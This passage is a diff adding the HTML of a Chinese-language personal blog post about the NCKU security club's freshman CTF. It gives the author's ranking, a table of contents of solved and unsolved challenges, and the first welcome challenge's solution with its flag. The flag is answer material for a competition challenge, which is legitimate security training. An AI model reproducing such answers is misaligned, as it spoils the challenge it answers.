@@ -1,0 +1,1324 @@
+<!DOCTYPE html>
+<html lang="zh-tw" dir="ltr" class="scroll-smooth" data-default-appearance="light"
+  data-auto-appearance="true"><head>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="zh-tw" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>成大資安社迎新杯 CTF &middot; 貝坦betan</title>
+  <meta name="title" content="成大資安社迎新杯 CTF &middot; 貝坦betan" />
+  
+  <meta name="description" content="這次打的是成大資安社迎新杯" />
+  <meta name="keywords" content="CTF, " />
+  
+  
+  <link rel="canonical" href="https://betan423.github.io/posts/009_weeklyctf04/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.5615a487fac507c43511df88c6ad42d8fd2f34979108ea0cb248cba1146fdcb8aad55e5fa3a2d69104e8e06875708d5c066abee2cf0d660691eb2f456d7d9f94.css"
+    integrity="sha512-VhWkh/rFB8Q1Ed&#43;Ixq1C2P0vNJeRCOoMskjLoRRv3Liq1V5fo6LWkQTo4Gh1cI1cBmq&#43;4s8NZgaR6y9FbX2flA==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.949e93ad68f98f91b41032983a7aee8da40cd845c548ac475ad1b4771bb9d273da1fb4d059d4d2f8f724a6a7ce5962b522b302ed72b43b8a1057a0e4e3ffc58e.js"
+    integrity="sha512-lJ6TrWj5j5G0EDKYOnrujaQM2EXFSKxHWtG0dxu50nPaH7TQWdTS&#43;PckpqfOWWK1IrMC7XK0O4oQV6Dk4//Fjg==" data-copy="" data-copied=""></script>
+  
+  
+  <script src="/js/zoom.min.js"></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="https://betan423.github.io/posts/009_weeklyctf04/">
+  <meta property="og:site_name" content="貝坦betan">
+  <meta property="og:title" content="成大資安社迎新杯 CTF">
+  <meta property="og:description" content="這次打的是成大資安社迎新杯">
+  <meta property="og:locale" content="zh_tw">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-10-14T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-10-14T00:00:00+00:00">
+    <meta property="article:tag" content="CTF">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="成大資安社迎新杯 CTF">
+  <meta name="twitter:description" content="這次打的是成大資安社迎新杯">
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "成大資安社迎新杯 CTF",
+    "headline": "成大資安社迎新杯 CTF",
+    
+    "abstract": "這次打的是成大資安社迎新杯",
+    "inLanguage": "zh-tw",
+    "url" : "https:\/\/betan423.github.io\/posts\/009_weeklyctf04\/",
+    "author" : {
+      "@type": "Person",
+      "name": "貝坦betan"
+    },
+    "copyrightYear": "2024",
+    "dateCreated": "2024-10-14T00:00:00\u002b00:00",
+    "datePublished": "2024-10-14T00:00:00\u002b00:00",
+    
+    "dateModified": "2024-10-14T00:00:00\u002b00:00",
+    
+    "keywords": ["CTF"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "679"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="貝坦betan" />
+  
+  
+  
+  <link href="https://discordapp.com/users/414682490125418496" rel="me" />
+  
+  
+  <link href="https://github.com/Betan423" rel="me" />
+  
+  
+  <link href="https://instagram.com/gul_dx600" rel="me" />
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.js" integrity=""></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>快轉到主要內容</a>
+  </div>
+  
+  
+  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    
+    
+    <div>
+        <a href="/" class="flex">
+            <span class="sr-only">貝坦betan</span>
+
+            <img src="/img/logo.png" width="90" height="90"
+                class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt="貝坦betan" />
+
+        </a>
+    </div>
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">貝坦betan</a>
+            
+
+        </nav>
+        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">
+
+            
+            
+            
+  <a href="/authors/betan/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        個人簡介
+    </p>
+</a>
+
+
+            
+            
+  <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        文章列表
+    </p>
+</a>
+
+
+            
+            
+  <a href="/future/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        未來規劃
+    </p>
+</a>
+
+
+            
+            
+  <a href="/intro/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        關於此網站
+    </p>
+</a>
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+
+        </nav>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12 h-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" for="menu-controller" class="block">
+            <input type="checkbox" id="menu-controller" class="hidden" />
+            
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li>
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/authors/betan/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            個人簡介
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            文章列表
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/future/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            未來規劃
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/intro/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            關於此網站
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                </ul>
+                
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+  
+  
+  
+  
+  
+
+
+<div class="w-full rounded-md h-36 md:h-56 lg:h-72 single_hero_basic nozoom" style="background-image:url(/img/Background_huf584403c160ed37e19e2052a9d2fea60_522599_1200x0_resize_box_3.png);"></div>
+
+
+
+<div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
+    style="background-image:url(/img/Background_huf584403c160ed37e19e2052a9d2fea60_522599_1200x0_resize_box_3.png);">
+    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
+    </div>
+    <div
+        class="absolute inset-0 opacity-30 dark:opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral dark:to-neutral-800 mix-blend-normal">
+    </div>
+</div>
+
+
+
+  
+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      成大資安社迎新杯 CTF
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2024-10-14 00:00:00 &#43;0000 UTC">14 October 2024</time><span class="px-2 text-primary-500">&middot;</span>
+
+
+<script type="text/javascript" src="/js/zen-mode.min.ccc8b2a0c4505216444ca25530c7328aa0bef94f43dabaf3e598e1b4271de9eec76c1cb35917471a4f7ccb8d84051b3acef42baa30724ac3a667fcf1fec4432a.js" integrity="sha512-zMiyoMRQUhZETKJVMMcyiqC&#43;&#43;U9D2rrz5ZjhtCcd6e7HbByzWRdHGk98y42EBRs6zvQrqjBySsOmZ/zx/sRDKg=="></script>
+
+<span class="mb-[2px]">
+    <span id="zen-mode-button"
+          class="text-lg hover:text-primary-500"
+          title=""
+          data-title-i18n-disable=""
+          data-title-i18n-enable="">
+        <span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="50px" height="50px">
+    <path fill="currentColor" d="M 12.980469 4 C 9.1204688 4 5.9804688 7.14 5.9804688 11 L 6 26 L 9.9804688 26 L 9.9804688 11 C 9.9804688 9.35 11.320469 8 12.980469 8 L 40.019531 8 C 41.679531 8 43.019531 9.35 43.019531 11 L 43.019531 39 C 43.019531 40.65 41.679531 42 40.019531 42 L 29 42 C 29 43.54 28.420938 44.94 27.460938 46 L 40.019531 46 C 43.879531 46 47.019531 42.86 47.019531 39 L 47.019531 11 C 47.019531 7.14 43.879531 4 40.019531 4 L 12.980469 4 z M 7 28 C 4.794 28 3 29.794 3 32 L 3 42 C 3 44.206 4.794 46 7 46 L 23 46 C 25.206 46 27 44.206 27 42 L 27 32 C 27 29.794 25.206 28 23 28 L 7 28 z M 7 32 L 23 32 L 23.001953 42 L 7 42 L 7 32 z"/>
+</svg>
+  </span>
+
+</span>
+    </span>
+</span>
+  
+
+  
+  
+</div>
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/ctf/&#34;,'_self');">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    CTF
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+
+    
+      
+      
+        
+        
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+        
+      
+      <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
+      alt="貝坦betan" src="/img/betan_logo_hub55e49c40b4490ecd617c90b9f40cd00_452457_192x192_fill_box_center_1.gif" />
+    
+  
+  <div class="place-self-center">
+    
+    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+      作者
+    </div>
+    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+      貝坦betan
+    </div>
+    
+    
+    <div class="text-sm text-neutral-700 dark:text-neutral-400">其實作者也只會是我啦哈哈</div>
+    
+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://discordapp.com/users/414682490125418496"
+          target="_blank"
+          aria-label="Discord"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M524.531,69.836a1.5,1.5,0,0,0-.764-.7A485.065,485.065,0,0,0,404.081,32.03a1.816,1.816,0,0,0-1.923.91,337.461,337.461,0,0,0-14.9,30.6,447.848,447.848,0,0,0-134.426,0,309.541,309.541,0,0,0-15.135-30.6,1.89,1.89,0,0,0-1.924-.91A483.689,483.689,0,0,0,116.085,69.137a1.712,1.712,0,0,0-.788.676C39.068,183.651,18.186,294.69,28.43,404.354a2.016,2.016,0,0,0,.765,1.375A487.666,487.666,0,0,0,176.02,479.918a1.9,1.9,0,0,0,2.063-.676A348.2,348.2,0,0,0,208.12,430.4a1.86,1.86,0,0,0-1.019-2.588,321.173,321.173,0,0,1-45.868-21.853,1.885,1.885,0,0,1-.185-3.126c3.082-2.309,6.166-4.711,9.109-7.137a1.819,1.819,0,0,1,1.9-.256c96.229,43.917,200.41,43.917,295.5,0a1.812,1.812,0,0,1,1.924.233c2.944,2.426,6.027,4.851,9.132,7.16a1.884,1.884,0,0,1-.162,3.126,301.407,301.407,0,0,1-45.89,21.83,1.875,1.875,0,0,0-1,2.611,391.055,391.055,0,0,0,30.014,48.815,1.864,1.864,0,0,0,2.063.7A486.048,486.048,0,0,0,610.7,405.729a1.882,1.882,0,0,0,.765-1.352C623.729,277.594,590.933,167.465,524.531,69.836ZM222.491,337.58c-28.972,0-52.844-26.587-52.844-59.239S193.056,219.1,222.491,219.1c29.665,0,53.306,26.82,52.843,59.239C275.334,310.993,251.924,337.58,222.491,337.58Zm195.38,0c-28.971,0-52.843-26.587-52.843-59.239S388.437,219.1,417.871,219.1c29.667,0,53.307,26.82,52.844,59.239C470.715,310.993,447.538,337.58,417.871,337.58Z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/Betan423"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://instagram.com/gul_dx600"
+          target="_blank"
+          aria-label="Instagram"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+  </div>
+</div>
+
+      
+
+      
+
+      
+      <div class="mb-5"></div>
+      
+
+    
+
+  </header>
+  
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+    
+     <div
+      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10">
+
+         <details open class="toc-right mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    目錄
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#解出">解出</a>
+      <ul>
+        <li><a href="#welcome--競賽規則">Welcome / 競賽規則</a></li>
+        <li><a href="#welcome--discord">Welcome / Discord</a></li>
+        <li><a href="#welcome--回饋表單">Welcome / 回饋表單</a></li>
+        <li><a href="#pwn-新手友善-overflow-tutorial">Pwn /[新手友善] Overflow Tutorial</a></li>
+        <li><a href="#pwn--every-pwners-first-challenge">Pwn / Every pwner&rsquo;s first challenge</a></li>
+        <li><a href="#reverse--">Reverse / ✌️✊✋</a></li>
+        <li><a href="#reverse--youtube-video-recommendation-tool">Reverse / Youtube Video Recommendation Tool</a></li>
+        <li><a href="#reverse--baby-python-assembly">Reverse / Baby Python Assembly</a></li>
+        <li><a href="#web--好駭客的網站">Web / 好駭客的網站</a></li>
+        <li><a href="#crypto--e">Crypto / E?</a></li>
+      </ul>
+    </li>
+    <li><a href="#未解出">未解出</a>
+      <ul>
+        <li><a href="#reverse--2048">Reverse / 2048??</a></li>
+        <li><a href="#web--just-image">Web / Just Image</a></li>
+        <li><a href="#misc--double-exploit">Misc / Double Exploit</a></li>
+      </ul>
+    </li>
+    <li><a href="#總結">總結</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    目錄
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#解出">解出</a>
+      <ul>
+        <li><a href="#welcome--競賽規則">Welcome / 競賽規則</a></li>
+        <li><a href="#welcome--discord">Welcome / Discord</a></li>
+        <li><a href="#welcome--回饋表單">Welcome / 回饋表單</a></li>
+        <li><a href="#pwn-新手友善-overflow-tutorial">Pwn /[新手友善] Overflow Tutorial</a></li>
+        <li><a href="#pwn--every-pwners-first-challenge">Pwn / Every pwner&rsquo;s first challenge</a></li>
+        <li><a href="#reverse--">Reverse / ✌️✊✋</a></li>
+        <li><a href="#reverse--youtube-video-recommendation-tool">Reverse / Youtube Video Recommendation Tool</a></li>
+        <li><a href="#reverse--baby-python-assembly">Reverse / Baby Python Assembly</a></li>
+        <li><a href="#web--好駭客的網站">Web / 好駭客的網站</a></li>
+        <li><a href="#crypto--e">Crypto / E?</a></li>
+      </ul>
+    </li>
+    <li><a href="#未解出">未解出</a>
+      <ul>
+        <li><a href="#reverse--2048">Reverse / 2048??</a></li>
+        <li><a href="#web--just-image">Web / Just Image</a></li>
+        <li><a href="#misc--double-exploit">Misc / Double Exploit</a></li>
+      </ul>
+    </li>
+    <li><a href="#總結">總結</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+   </div>
+      </div>
+      
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+        
+
+
+        <div class="article-content max-w-prose mb-20">
+          <div class="lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl">
+  <p>別虐了&hellip;</p>
+<p>算在每周ctf內，之後應該都把名子改成比賽名稱<br>
+共通點應該是都不會有封面</p>
+
+</div>
+
+
+
+<h2 class="relative group">前言 
+    <div id="%E5%89%8D%E8%A8%80" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E5%89%8D%E8%A8%80" aria-label="定位點">#</a>
+    </span>        
+    
+</h2>
+<p>比賽剛開就把會的題目就秒殺了 直接衝到第三名<br>
+然後再來就開始躺了</p>
+<blockquote>
+<p>❎ 不會解<br>
+✅ 懶得解</p>
+</blockquote>
+<p>這次Misc一題都 <del>不會</del> 不敢碰<br>
+本次排名 25/106 解出10題
+<img src="rank.png"  /></p>
+
+
+<h2 class="relative group">解出 
+    <div id="%E8%A7%A3%E5%87%BA" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E8%A7%A3%E5%87%BA" aria-label="定位點">#</a>
+    </span>        
+    
+</h2>
+
+
+<h3 class="relative group">Welcome / 競賽規則 
+    <div id="welcome--%E7%AB%B6%E8%B3%BD%E8%A6%8F%E5%89%87" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#welcome--%E7%AB%B6%E8%B3%BD%E8%A6%8F%E5%89%87" aria-label="定位點">#</a>
+    </span>        
+    
+</h3>
+<p>在ruls的部分最下面有一串base64的東東，丟去解密後就有flag了</p>
+<p>flag: NCKUCTF{我會遵守以上規則因為我是好駭客}</p>
+
+
+<h3 class="relative group">Welcome / Discord 
